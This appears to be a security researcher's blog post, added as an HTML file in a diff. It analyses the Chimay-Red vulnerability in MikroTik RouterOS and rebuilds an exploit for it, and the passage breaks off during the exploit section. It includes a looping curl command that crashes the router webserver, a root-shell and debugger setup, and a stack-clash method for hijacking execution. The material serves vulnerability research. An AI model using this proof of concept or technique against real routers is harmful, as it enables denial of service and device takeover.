@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <base href="">
+
+    <link rel="icon" type="image/png" href="/theme/ico/favicon/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/theme/ico/favicon/android-chrome-192x192.png" sizes="192x192">
+    <link rel="icon" type="image/png" href="/theme/ico/favicon/favicon-16x16.png" sizes="16x16">
+    <link rel="manifest" href="/theme/ico/favicon/manifest.json">
+    <link rel="mask-icon" href="/theme/ico/favicon/safari-pinned-tab.svg" color="#5bbad5">
+    <link rel="shortcut icon" href="/theme/ico/favicon/favicon.ico">
+
+    
+    <script src="/theme/js/lib/jquery-3.2.1.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="/theme/css/uikit.min.css" />
+    <!-- custom css -->
+    <link rel="stylesheet" type="text/css" href="/theme/css/custom.min.css" />
+    <!-- default pygment style is the 'default' style -->
+    <link rel="stylesheet" type="text/css" href="/theme/css/pygment.min.css" />
+    <script src="/theme/js/uikit.min.js"></script>
+    <title>Chimay-red🥔potato.sh🥔</title>
+   <meta name="tags" content="Reverse-Engineering, Exploit, Zero-Day, CIA, WikiLeaks" />  <meta name="description" content="This post outlines and presents the rediscovery, vulnerability analysis and exploitation of a zero-day vulnerability that was originally discovered and..." />  <meta name="category" content="Research" /> 
+  </head>
+  <body>
+<div class="uk-container uk-container-center uk-margin-top uk-margin-large-bottom">
+    <nav class="uk-navbar uk-margin-large-bottom">
+        <a class="uk-navbar-brand uk-hidden-small" href="">potato.sh</a>
+        <ul class="uk-navbar-nav uk-hidden-small">
+      <li class="uk-active"><a href="/category/research.html">Research</a></li>
+        </ul>
+        <a href="#offcanvas" class="uk-navbar-toggle uk-visible-small" data-uk-offcanvas=""></a>
+        <div class="uk-navbar-brand uk-navbar-center uk-visible-small">potato.sh</div>
+    </nav>
+    <div class="uk-grid" data-uk-grid-margin="">
+        <main class="uk-width-medium-3-4">
+<article>
+<div class="uk-article">
+    <header>
+    <h1 class="capitalize uk-article-title">
+        <a href="/chimay-red.html">Chimay-Red</a>
+    </h1>
+    <p class="uk-article-meta">
+    Published on   <time datetime="2018-04-28">Sat 28 April 2018</time>
+        by         <a class="url fn" href="/author/dayton.html">Dayton</a>
+    posted in <a href="/category/research.html">Research</a>
+    <br/>
+    <a href="/tag/reverse-engineering.html" class="uk-icon-tag">Reverse-Engineering</a>
+    <a href="/tag/exploit.html" class="uk-icon-tag">Exploit</a>
+    <a href="/tag/zero-day.html" class="uk-icon-tag">Zero-Day</a>
+    <a href="/tag/cia.html" class="uk-icon-tag">CIA</a>
+    <a href="/tag/wikileaks.html" class="uk-icon-tag">WikiLeaks</a>
+
+    </p>
+    </header>
+    <p>This post outlines and presents the rediscovery, vulnerability analysis and exploitation of a zero-day vulnerability that was
+originally discovered and exploited by the CIA's "Engineering Development Group"; remotely targeting MikroTik's RouterOS
+embedded operating system that was discovered during the "Vault 7" leak via WikiLeaks in March of 2017.</p>
+<p><strong>NOTE:</strong> I originally posted this article on the blog over at the company I work for: <a href="http://blog.seekintoo.com/chimay-red.html">Original Article</a></p>
+<p><br></p>
+<h2>Brief History and Background</h2>
+<p><img src="images/chimay-red/mikrotik-logo.png" width=300 height=95></p>
+<p><a href="https://mikrotik.com/"><strong>MikroTik</strong></a> (MK) is a Latvian company founded in 1996 and is known for its routers, switches and wireless network equipment.
+MikroTik is primarily famous for its embedded routing OS/hardware ecosystem: RouterOS and RouterBOARD.</p>
+<p><a href="https://mikrotik.com/software"><strong>RouterOS</strong></a> is a <a href="https://uclibc.org/"><em>uClibC</em></a> <code>Linux 3.3.5</code> based embedded OS with a proprietary software based routing suite and tool set written in C++ called "NOVA", and is MK's OS for nearly all of their hardware routing - switching products.
+RouterOS was originally designed for running on the <a href="https://mikrotik.com/products"><strong>RouterBOARD</strong></a> line of products, but as of the last few years, MK has opened the ability to run RouterOS on any almost any x86 hypervisor, baremetal x86 and more recently a <a href="https://aws.amazon.com/marketplace/pp/B01E00PU50"><strong>AWS</strong></a> cloud offering.</p>
+<p>What really makes RouterOS and RouterBOARD an attractive option for many is its price point versus the competition with comparable performance and often extra features. A Cisco switch supporting MPLS will run you a few thousand dollars, while the competing MK offering with MPLS is 4x cheaper on average. Although managing an advanced configuration of RouterOS can be a bit of a curve if you are not familiar with systems like Cisco's IOS</p>
+<p><strong>Note:</strong> The NOVA suite will not run outside of RouterOS (Eg. docker container) without serious hacks, which I will show in a later post. Having done this has opened up an easier method for exploit fuzzing and testing across many architectures and versions using QEMU or other instrumentable architecture virtualization.</p>
+<p><img src="images/chimay-red/kit450_11.png" width=500 height=500> </p>
+<p><em>RouterBOARD 850gx3</em></p>
+<h3>Plausible causes of interest (speculation)</h3>
+<p>Why might the CIA be interested in exploiting these devices? Well for starters at any given time, between 1,500,000 and 2,000,000 MK RouterOS devices are exposed on the public net, as seen via <a href="https://www.shodan.io/search?query=mikrotik">shodan.io</a>. These figures are on par with Cisco's exposure numbers and typically three times more exposed than D-Link and other usual suspects.</p>
+<p><a href="https://censys.io/ipv4?q=%28MikroTik+RouterOS%29+AND+protocols.raw%3A+%2280%2Fhttp%22+OR+protocols.raw%3A+%228080%2Fhttp%22+AND+80.http.get.status_code%3A+200+OR+8080.http.get.status_code%3A+200">Censys</a> additionally reports that around 50,000 RouterOS devices currently have the HTTP management interface exposed to the public net. Top RouterOS device host countries include (in-order): Brazil, China, Indonesia and Russia. </p>
+<p><img alt="population-map" src="images/chimay-red/2018-03-29-105215_659x399_scrot.png"></p>
+<p><em>shodan.io device map: 1 == 1000 devices</em></p>
+<p>In combination with MK's current deployed scale globally and population in known targeted countries it seems reasonable that MK would be a prime candidate for such exploit development by a nation state. Similarly, found within the leaks is documentation for an exploit kit that compromises the AVTech Network Video Recorder code-named "Mealybug". As of posting this article, AVTech devices are the second most popular shodan search term, with around <a href="https://www.shodan.io/search?query=linux+upnp+avtech">130,000</a> results worldwide; Further re-enforcing the idea that the CIA has interest in developing exploits for very popular consumer hardware.</p>
+<p>Kaspersky also shows claims that tooling to exploit MK has been around "for a long time", as seen in the "Slingshot" APT report <a href="https://securelist.com/apt-slingshot/84312/">FAQ</a> published this year.</p>
+<h3>Vault 7</h3>
+<p><a href="https://wikileaks.org/ciav7p1/"><strong>Vault 7</strong></a> aka. "Year Zero" was a mega-dump of approximately 23 projects and other various artifacts on Tuesday March 7th, 2017 from the CIA's Engineering Development Group (EDG) division at the Center for Cyber Intelligence (CCI)), a special development branch belonging to the CIA's <a href="https://www.cia.gov/offices-of-cia/digital-innovation">Directorate for Digital Innovation</a> (DDI) in Langley, Virginia.
+Comprising 8,761 documents and files, the leaks detailed abilities to compromise cars, smart TVs, browsers, phones and operating systems. Most, if not all, leaked projects were developed to preform electronic surveillance and/or cyber-warfare. Although no vulnerability sources or binaries were released, the leaked documentation has given attackers significant direction in rediscovering many of the same exploits.</p>
+<p><img alt="edg-logo" src="images/chimay-red/edg.png"></p>
+<p>The Engineering Development Group is responsible for building certain notable tools as discovered in the leaks, such as: Hive, Cutthroat, <strong>Chimay-Red</strong>, Dark Matter, and Sonic Screwdriver. These tools were distributed to operators and partners when conducting proxy cyber-activities in regions where the US may face legal issues the partner state does not have as stringent laws against.</p>
+<h2>Chimay-Red</h2>
+<h3>Background</h3>
+<p>Chimay-Red is a zero-day exploit for the HTTP management/configuration/proxy webserver called <code>www</code> in MK RouterOS versions <code>6.x</code>, originally targeting MIPS, MIPSEL, PPC, and x86 architectures. The exploit abuses a multithreaded remote stack collision vulnerability due to an implementation error with the usage of the compiler built-in <code>alloca()</code> by "allocating" a untrusted remotely supplied <code>size</code> value during a content-length header check. It is believed that Chimay-Red was originally used to implant HIVE or TinyShell onto the target system, as noted in the "hive-UsersGuide.pdf" document under: "7.1 (S) Installing Hive on MikroTik MIPS RouterOS 6.x using Chimay-Red".</p>
+<p>Documentation and version release notes suggest that development of the exploit was completed around 07/2015 (<a href="https://wikileaks.org/vault7/document/hive-UsersGuide/page-29/#pagination">pg. 29</a> hive-UsersGuide.pdf):</p>
+<div class="highlight"><pre><span></span>V2.9 (07/01/2015)
+• Adds a user-defined directory path for the .config and .log files to avoid read-only memory.
+• Adds support for MikroTik 6.x.
+</pre></div>
+
+
+<p><br></p>
+<p>Also found within hive-UsersGuide.pdf <a href="https://wikileaks.org/vault7/document/hive-UsersGuide/page-24/#pagination">pg. 23</a> and <a href="https://wikileaks.org/ciav7p1/cms/files/image2015-4-27%2010:46:48.png">image2015-4-27%2010:46:48.png</a> is usage and other interesting information about Chimay-Red's inner workings:</p>
+<h3>Exploit Usage:</h3>
+<p><img alt="cr-usage" src="images/chimay-red/chimay-usage.png"></p>
+<hr>
+<h3>Operator usage Python traceback screenshot:</h3>
+<p><img alt="traceback" src="images/chimay-red/operator-traceback.png"></p>
+<p>Notice the hierarchy of the traceback from the Python interpreter. Arguments are passed into the entrypoint, which chooses the exploit module within <code>ChimayRed_v3.7/bin/libs/&lt;arch&gt;/Exploit.py</code> based off of detected or selected architecture and throws the payload in the given module to the given host and port.</p>
+<p>The <code>throw_v6()</code> (exploit version 6.x) function seems to use multiple sockets and predetermined or at least stored content-length and content values to some HTTP POST-able endpoint, which is a interesting hint towards where we might find this bug in the webserver binary.</p>
+<p>Unfortunately, due to the lack of information available within the leaks pertaining the Chimay-Red exploit, I was not unable to recover any more useful background or hints. However, I was confident that I had learned enough to tackle exploiting the vulnerability myself.</p>
+<h2>Chimay-Red (my turn)</h2>
+<p>Up to the challenge to try and see if I could match what these vulnerability researchers had accomplished in secret and more, I was excited to get started hunting. I had a couple other things going for me as well at the time, some MK MIPS based devices on-hand, the Python traceback screenshot and manuals from the leaks and a patched version of RouterOS released by MK fixing the said vulnerability:</p>
+<p><img alt="relnotes" src="images/chimay-red/www-fixed-relnotes.png"></p>
+<p><em>MK 6.38.5 release notes - <a href="https://mikrotik.com/download/changelogs#show-tab-tree_3-id-e06d147a0be32029e18acff2f5009096">link</a></em></p>
+<h3>Initial Goals</h3>
+<p>I didn't just want to replicate the exploit exactly, I wanted to make it even better. So I created a set of requirements for myself of what I think my version of the exploit should accomplish. </p>
+<ul>
+<li>
+<p>The replica exploit <strong>will</strong>:</p>
+<ul>
+<li>At minimum, conform to the operators usage guide.</li>
+<li>Support the same architectures and commands.<ul>
+<li><strong>Note:</strong> Specific supported 6.x versions are unknown via the leaks.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>The replica exploit <strong>should</strong>:</p>
+<ul>
+<li>Support all 6.x versions and architectures</li>
+<li>Tooling for enumerating, downloading, analyzing and cataloging system firmware<ul>
+<li>Needed for building ROP-chains and store metadata for approx ~200 different FW versions</li>
+<li>Containerize and optionally emulate any system firmware for fuzzing and testing.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3>On The Hunt</h3>
+<p>Extracting FW images:</p>
+<p><a href="https://github.com/ReFirmLabs/binwalk">Binwalk</a> can help us make quick work of identifying magic bytes within the firmware files in-order to extract the root <a href="https://en.wikipedia.org/wiki/SquashFS">SquashFS</a> filesystem.</p>
+<div class="highlight"><pre><span></span>$ binwalk -e ./routeros-&lt;architecture&gt;-&lt;version&gt;.npk ./routeros-&lt;architecture&gt;-&lt;version&gt;.npk
+<span class="m">4096</span>    0x1000   Squashfs filesystem, little endian, version <span class="m">4</span>.0, compression:xz, size: <span class="m">7109576</span> bytes, <span class="m">1034</span> inodes, blocksize: <span class="m">262144</span> bytes, created: <span class="m">2016</span>-10-05 <span class="m">12</span>:07:28
+</pre></div>
+
+
+<p>Webserver Binary Location:</p>
+<div class="highlight"><pre><span></span>$ find <span class="nv">$firmware</span>-images.extracted/squashfs-root -name <span class="s2">&quot;www&quot;</span> -type f
+firmware-images.extracted/squashfs-root/nova/bin/www
+
+$ file <span class="nv">$firmware</span>-images.extracted/squashfs-root/nova/bin/www
+www: ELF <span class="m">32</span>-bit LSB executable, MIPS, MIPS32 rel2 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+</pre></div>
+
+
+<h3>WWW Reverse Engineering Notes</h3>
+<p>Full reverse engineering analysis of the <code>www</code> webserver binary is outside the scope of this post. Although I will provide some important notes:</p>
+<ul>
+<li>One thread per socket connection.</li>
+<li>Each connection is allocated 128KiB (0x20000) of stack space per thread<ul>
+<li>This is set by <code>pthread_attr_setstacksize</code> in <code>main()</code></li>
+</ul>
+</li>
+<li>Each thread stack space is allocated ontop on the previous thread.</li>
+</ul>
+<div class="highlight"><pre><span></span>|             |
+^-------------^ &lt; Thread2 ESP
+|             |
+|             |
+|   Thread1   |
+|             |
+^-------------^ &lt; Thread1 ESP
+|             |
+|             |
+|   Thread0   |
+|             |
+^-------------^ &lt; Thread0 ESP
+</pre></div>
+
+
+<ul>
+<li>Automatically restarted on crash after <em>three</em> seconds<ul>
+<li>The <code>loader</code> arbiter (<code>/nova/bin/loader</code>) controls this via signal handling and PID tracking.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>ELF Mitigations:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Architecture</th>
+<th>NX</th>
+<th>CANARY</th>
+<th>PIE</th>
+<th>RELRO</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>x86</td>
+<td>YES</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+</tr>
+<tr>
+<td>ARM</td>
+<td>YES</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+</tr>
+<tr>
+<td>POWERPC</td>
+<td>YES</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+</tr>
+<tr>
+<td>SMIPS</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+</tr>
+<tr>
+<td>MMIPS</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+</tr>
+<tr>
+<td>MIPSBE</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+</tr>
+<tr>
+<td>TILE</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+<td>NO</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3><a href="#bindiff_analysis">Analyzing the <em>difference</em> with IDA and BinDiff</a></h3>
+<p>By looking at the difference in the assembled sections of the binary of the known vulnerable version and the known fixed version gave a clear look into what exactly has been patched to fix the vulnerability.</p>
+<p><strong>Note:</strong> <em>A good BinDiff trick is to look for lowest similarity with high confidence</em></p>
+<p><img src="images/chimay-red/bindiff1.png" width=1000 height=100></p>
+<p><em>6.38.4 versus 6.38.5 BinDiff subroutine similarity chart</em></p>
+<p>It appears <em><code>Request::readPostData(int32_t arg1, int32_t arg2)</code></em> would be a prime candidate to diff due it being the function with the highest confidence rating of a altered subroutine at a score of "0.82".</p>
+<p><img alt="bindiff" src="images/chimay-red/bindiff3.png"></p>
+<p><em>Left: 6.38.4 (x86) | Right: 6.38.5 (x86)</em></p>
+<p>I could not get IDA to produce psuedocode for the subroutine, so instead I have hand written it below (correct me if wrong, please):</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">header</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">recv_len</span><span class="p">;</span>
+<span class="kt">int</span> <span class="o">*</span><span class="n">alloca_sp</span>
+<span class="kt">int</span> <span class="n">content_length_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">content_length</span><span class="p">;</span>
+
+<span class="c1">// Block until request received</span>
+<span class="n">recv_len</span> <span class="o">=</span> <span class="n">sock</span><span class="o">::</span><span class="n">recv</span><span class="p">(</span><span class="mi">32768</span><span class="p">);</span>
+
+<span class="c1">// Set the name of the header we are looking for</span>
+<span class="n">string</span><span class="o">::</span><span class="n">string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">content_length</span><span class="p">,</span> <span class="s">&quot;content_length&quot;</span><span class="p">);</span>
+
+<span class="c1">// Grab given header_name given the raw request.</span>
+<span class="n">header</span> <span class="o">=</span> <span class="n">Headers</span><span class="o">::</span><span class="n">getHeader</span><span class="p">(</span><span class="o">&amp;</span><span class="n">content_length</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">content_length_value</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">header</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">recv_len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">recv_len</span> <span class="o">&lt;</span> <span class="n">content_length_value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="c1">// Stack colision vulnerability due to insufficient content_length_value filtering as seen above.</span>
+<span class="c1">// This call is optimized to &quot;sub eax, esp&quot; with most compilers.</span>
+<span class="n">alloca_sp</span> <span class="o">=</span> <span class="n">alloca</span><span class="p">(</span><span class="n">content_length_value</span><span class="p">);</span>
+
+<span class="c1">// Read content_length_value bytes from socket and write </span>
+<span class="c1">// into newly likely improperly allocated stack space. (SIGSEGV)</span>
+<span class="n">istream</span><span class="o">::</span><span class="n">read</span><span class="p">(</span><span class="n">alloca_sp</span><span class="p">,</span> <span class="n">content_length_value</span><span class="p">)</span>
+</pre></div>
+
+
+<h3>So what's the vulnerability?</h3>
+<p>Since no filtering/conditionals are happening to ensure that the <code>content-length_value</code> does not exceed the thread stack page size limits, the vulnerability could be triggered by passing a negative number into the <code>content-length</code> header. This results in a <code>alloca()</code> *size argument far exceeding the size of the current connection thread stack frame size of 128KiB during a logical AND of the <code>size</code> value to enforce stack alignment.</p>
+<p><strong><code>alloca()</code> in-lined assembly snippet from readPostData():</strong></p>
+<div class="highlight"><pre><span></span> 8055a56:   8d 42 10                lea    eax,[edx+0x10] &lt;&lt; load effectively content_length_value from edx+0x10 into eax
+ 8055a59:   83 e0 f0                and    eax,0xfffffff0 &lt;&lt; AND content_length_value to enforce stack alignment at mutliples of 16 bytes
+ 8055a5c:   29 c4                   sub    esp,eax        &lt;&lt; &quot;allocate&quot; space by subtracting the stack pointer (esp) by content_legth_value
+</pre></div>
+
+
+<p><strong>Example <code>alloca()</code> alignment in Python:</strong></p>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">content_length_value</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="p">(</span><span class="n">content_length_value</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF0</span>
+<span class="mi">4294967264</span>
+</pre></div>
+
+
+<p>As you can see in the example alignment calculation, due to the logical AND preformed on the <code>content_length_value</code> to enforce the <em>stacksize</em> to be in alignment with <em>STACK_ALIGN</em> (16 bytes on most architectures), an integer overflow has occurred. This will cause <code>alloca()</code> to attempt to subtract the stack pointer by a massive amount, exhausting additional thread stack space causing the webserver to <strong>SIGSEGV</strong> when that unallocated memory is improperly accessed during the next threaded connection or by other arbitrary access.</p>
+<p>The patched version ensures no such overlaps can occur by first validating the content_length_value and resizing before reaching <code>alloca()</code>.</p>
+<h3>Identifying a POST method URL endpoint on the webserver:</h3>
+<p>To discover a URL endpoint on the webserver that I could actually POST arbitrary data into, I fired up WireShark and browsed to the login page of the management server and logged in. This shows a POST endpoint available in the working directory called <code>/jsproxy</code>:</p>
+<p><img alt="wireshark" src="images/chimay-red/wireshark-jsproxy.png"></p>
+<h3>PoC ()</h3>
+<p>At this point we should have a proof of concept that we can use to test if the target webserver crashes. Simply passing a negative one into the <code>content_length</code> header should be enough
+to wrap the integer and overallocate to crash the server. To test, we can craft this header with CURL in a POST request and spam the webserver with it in a loop :).</p>
+<p><strong>CURL</strong> PoC:</p>
+<div class="highlight"><pre><span></span><span class="k">while</span> <span class="p">;</span> <span class="k">do</span> curl -X POST -H <span class="s2">&quot;Content-Length: -1&quot;</span> -d <span class="s1">&#39;{&quot;foo&quot;:&quot;bar&quot;}&#39;</span> http://&lt;target&gt;:80/jsproxy <span class="o">&amp;&amp;</span> sleep <span class="m">0</span>.5<span class="p">;</span> <span class="k">done</span>
+</pre></div>
+
+
+<p><strong>ASCIInema</strong> PoC demo:</p>
+<script src="https://asciinema.org/a/8vwWooxhCZw7jtAmtbuINFtYE.js" id="asciicast-8vwWooxhCZw7jtAmtbuINFtYE" async></script>
+
+<p>As you can see, the webserver crashes and is automatically restarted every three seconds.</p>
+<h2>Building the Exploit</h2>
+<p>For a test target, I just installed RouterOS within VirtualBox and bound the first interface to a host-only adapter. I won't be covering this in particular, in-depth instructions can be found on <a href="https://www.techonia.com/218/install-mikrotik-virtualbox">Google</a>.</p>
+<p>Most of the tools I used in this section and recommend others to use for embedded Linux exploit development/research:</p>
+<ul>
+<li><a href="https://github.com/Gallopsled/pwntools">pwntools</a></li>
+<li><a href="http://www.devttys0.com/2013/10/mips-rop-ida-plugin/">MIPSROP</a></li>
+<li><a href="https://www.gnu.org/software/gdb/">GDB</a></li>
+<li><a href="https://github.com/longld/peda">GDB PEDA</a></li>
+<li><a href="https://github.com/hugsy/gef">GEF</a></li>
+<li><a href="https://www.gnu.org/software/binutils/">Binutils Collection</a></li>
+</ul>
+<h3>Getting a debugger on the target</h3>
+<p>I'm going to need a debugger on my target in-order to further understand and analyze the crash before going any further.
+This is a fairly simple and straightforward process thanks to MK enabling something called <code>devel-login</code>, which will allow us to gain a root shell.</p>
+<ol>
+<li>Mount both partitions from RouterOS Virtual Disk</li>
+</ol>
+<div class="highlight"><pre><span></span>$ mount /dev/sda1 /mnt/disk1
+</pre></div>
+
+
+<div class="highlight"><pre><span></span>$ mount /dev/sda2 /mnt/disk2
+</pre></div>
+
+
+<ol>
+<li>Create a file called <code>devel-login</code> in /dev/disk2/etc/</li>
+</ol>
+<div class="highlight"><pre><span></span>$ touch /dev/disk2/etc/devel-login
+</pre></div>
+
+
+<ol>
+<li>Copy uClibC compiled gdbserver to <code>/mnt/disk1/flash/bin</code></li>
+</ol>
+<div class="highlight"><pre><span></span>$ cp ./gdbserver /mnt/disk/flash/bin
+</pre></div>
+
+
+<ol>
+<li>Connect over telnet to target and login as <code>devel-login</code>, blank password:</li>
+</ol>
+<div class="highlight"><pre><span></span>MikroTik <span class="m">6</span>.38.4 <span class="o">(</span>stable<span class="o">)</span>
+MikroTik Login: devel-login
+Password:
+
+BusyBox v1.00 <span class="o">(</span><span class="m">2017</span>.03.02-08:29+0000<span class="o">)</span> Built-in shell <span class="o">(</span>ash<span class="o">)</span>
+Enter <span class="s1">&#39;help&#39;</span> <span class="k">for</span> a list of built-in commands.
+
+<span class="c1">#</span>
+</pre></div>
+
+
+<ol>
+<li>Run the gdbserver previously copied into <code>/flash/bin/gdbserver.i686</code>:</li>
+</ol>
+<div class="highlight"><pre><span></span>$ /flash/bin/gdbserver <span class="m">0</span>.0.0.0:4444 --attach <span class="k">$(</span>pidof www<span class="k">)</span>
+</pre></div>
+
+
+<p>You can now do remote debugging with GDB:</p>
+<div class="highlight"><pre><span></span>$ gdb -q
+
+gdb-peda$ target remote <span class="m">192</span>.168.56.124:4444
+</pre></div>
+
+
+<h3>Exploit Building Preconditions and Requirements</h3>
+<p>To avoid NX (non-executable) memory protections and ASLR (Address-Space-Layout-Randomization) on (x86, ARM, POWERPC), typical return-oriented techniques can be employed to reuse existing executable memory once execution flow via the IP (Instruction Pointer) is controlled. Therefore on systems without NX applied (MIPS* and TILE); NX does not need to be bypassed and has the ability to execute code on the stack. For my purposes I will be using a ROP (Return-Oriented-Programming) chain every time for every architecture regardless.
+Why? Because why not? ROP chains work on both systems with and without NX protections, can't hurt ¯_(ツ)_/¯.</p>
+<p>But what this still means is the attacker (me) must have the target version of webserver (www) present to gather instruction offsets for ROP. This is where MikroDB comes in as you will see shortly in the post.</p>
+<p><strong>Detecting architecture remotely</strong></p>
+<p>Architecture is discovered remotely via a protocol called MNDP (MikroTik Neighbor Discovery Protocol).</p>
+<p><a href="https://mikrotik.com/testdocs/ros/3.0/system/mndp_content.php">MNDP</a></p>
+<div class="highlight"><pre><span></span>The MikroTik Neighbor Discovery Protocol (MNDP) eases network configuration and management
+by enabling each MikroTik router to discover other connected MikroTik routers and learn
+information about the system along with features which are enabled. The MikroTik routers 
+can automatically use learned information to set up some features with minimal or no configuration.
+
+
+MNDP features:
+
+works on IP level connections
+works on all non-dynamic interfaces
+distributes basic information on the software version
+distributes information on configured features that should interoperate with other MikroTik routers
+</pre></div>
+
+
+<p>The type of information usually associated with MNDP packets are:</p>
+<ul>
+<li>age</li>
+<li>address</li>
+<li>identity</li>
+<li>interface(s)</li>
+<li>mac-address</li>
+<li>platform</li>
+<li>software-id</li>
+<li>unpack version</li>
+<li>uptime,</li>
+<li><strong>hardware info</strong></li>
+</ul>
+<p>To take use of MNDP for detecting the target architecture, its usage is simplified as so:</p>
+<ol>
+<li>Send four null bytes ('\0\0\0\0') to <code>255.255.255.255:5678</code>.</li>
+<li>Wait a little while.</li>
+<li>Receive information back on <code>0.0.0.0:5678</code>.</li>
+</ol>
+<p><strong>Detecting version remotely</strong></p>
+<p>Detecting the remote version is simple for majority of the exposed services.</p>
+<p>Here's a few:</p>
+<ul>
+<li>
+<p><strong>HTTP</strong></p>
+<ul>
+<li>Version string in HTML GET request data from maintenance webpage</li>
+</ul>
+</li>
+<li>
+<p><strong>FTP</strong></p>
+<ul>
+<li>Version string in banner<ul>
+<li><code>220 MikroTik FTP server (MikroTik 6.38.4) ready</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>TELNET</strong></p>
+<ul>
+<li>Version string in banner<ul>
+<li><code>MikroTik v6.38.4 (stable)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>MNDP</strong></p>
+<ul>
+<li>Version string in version entry within MNDP packet.</li>
+</ul>
+</li>
+</ul>
+<p>The obvious caveat of using MNDP to retrieve this information, is that the attacker is required to be within the targets subnet.</p>
+<h2>Abusing alloca(); a multithreaded tango</h2>
+<p><strong><code>man 3 alloca</code>:</strong></p>
+<div class="highlight"><pre><span></span>void *alloca(size_t size)
+
+...
+
+The  alloca() function allocates size bytes of space in the stack frame of the caller.
+If the allocation causes stack overflow, program behavior is undefined.
+</pre></div>
+
+
+<p><br></p>
+<p>The procedure is as follows:</p>
+<p><br></p>
+<ol>
+<li>Two socket connections to the webserver are established, causing <code>www</code> to create two threads to handle the connections. Both threads are expecting HTTP headers and so they are both blocking on a read operation.</li>
+</ol>
+<p><strong>Note:</strong> Gray represents the space already taken up on the stack for existing data.</p>
+<p><img src="images/chimay-red/stack-diagram0.PNG" alt="step0" width=800 height=600></p>
+<ol>
+<li>Thread1 is sent HTTP headers with an HTTP Content-Length string equivalent to 0x29000 (THREAD_STACK_SIZE + <code>len(payload)</code> + SAFE_SPACE). Once headers are received, Thread1's initial read operation finishes. It performs the alloca, subtracting its stack pointer by 0x29000, which places its pointer for *buf at 0x8000 bytes down from the top of Thread2's stack:</li>
+</ol>
+<p><img src="images/chimay-red/stack-diagram1.PNG" alt="step1" width=800 height=600></p>
+<ol>
+<li>Thread1 is then sent approximately 0x1000 bytes of the 0x29000 it is expecting alligned for istream::read(). This advances the *buf pointer index used by istream::read() up the stack, closer to Thread2's current stack pointer. Thread1 continues waiting as it has not yet received the full amount of data expected (0x29000).</li>
+</ol>
+<p><img src="images/chimay-red/stack-diagram2.PNG" alt="step2" width=800 height=600></p>
+<ol>
+<li>Thread2, still waiting on its initial network read, is sent HTTP POST headers with a Content-Length string equivalent to approximately the size of the payload (0x8000 as an example), which it uses for its own alloca, subtracting from its stack pointer. Coordinating this length carefully places it precisely where the *buf pointer in Thread1 istream::read() currently points, in the below diagram I have placed it just above so it's visible. Thread2 then calls istream::read() to receive its HTTP Content-Data, causing it to block while waiting to read in data.</li>
+</ol>
+<p><img src="images/chimay-red/stack-diagram3.PNG" alt="step3" width=800 height=600></p>
+<ol>
+<li>Thread1 is then sent the payload data it is waiting to receive, which is stored starting at its current *buf index in istream::read(), and overwrites where Thread2's stored return address is for istream::read().</li>
+</ol>
+<p><img src="images/chimay-red/stack-diagram4.PNG" alt="step4" width=800 height=600></p>
+<ol>
+<li>A return from istream::read() can then be triggered by simply closing the connection. Once Thread2 returns, EIP is restored from the overwritten return address value and execution flow is controlled.</li>
+</ol>
+<p><img src="images/chimay-red/stack-diagram5.PNG" alt="step5" width=800 height=600></p>
+<p><br></p>
+<p>return address overwrite calculation eg:</p>
+<div class="highlight"><pre><span></span><span class="n">ADDR_SIZE</span> <span class="o">=</span> <span class="mi">8</span>
+<span class="n">SAFE_SPACE</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<span class="n">THREAD_STACK_SIZE</span> <span class="o">=</span> <span class="mh">0x20000</span>
+<span class="n">PAYLOAD_LEN</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># 0x8000</span>
+
